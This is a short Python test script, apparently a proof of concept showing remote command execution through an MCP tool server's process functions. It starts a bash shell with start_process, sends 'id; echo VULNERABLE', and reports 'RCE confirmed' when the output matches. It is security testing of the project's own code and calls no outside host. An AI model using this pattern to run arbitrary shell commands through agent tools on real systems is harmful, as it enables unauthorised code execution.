import sys
import os
import time

# Add src to path
sys.path.insert(0, os.getcwd())

from llmc_mcp.te.process import start_process, read_output, send_input

def test_repl_rce():
    print("--- PoC: REPL RCE via linux_proc_start (simulated) ---")
    
    # 1. Start a bash shell (simulating linux_proc_start("bash"))
    try:
        mp = start_process(command="bash")
        print(f"[+] Started bash process: {mp.proc_id} (PID: {mp.pid})")
    except Exception as e:
        print(f"[-] Failed to start bash: {e}")
        return

    # 2. Send a command (simulating linux_proc_send)
    cmd = "id; echo 'VULNERABLE'"
    print(f"[+] Sending command: {cmd}")
    send_input(mp.proc_id, cmd)
    
    # 3. Read output (simulating linux_proc_read)
    time.sleep(1) # Wait for execution
    output, state = read_output(mp.proc_id, timeout_sec=2.0)
    
    print(f"[+] Output:\n{output}")
    
    if "uid=" in output and "VULNERABLE" in output:
        print("\n[!] SUCCESS: RCE confirmed! executed 'id' inside the shell.")
    else:
        print("\n[-] FAILED: Could not verify RCE.")

    mp.p.terminate()

if __name__ == "__main__":
    test_repl_rce()
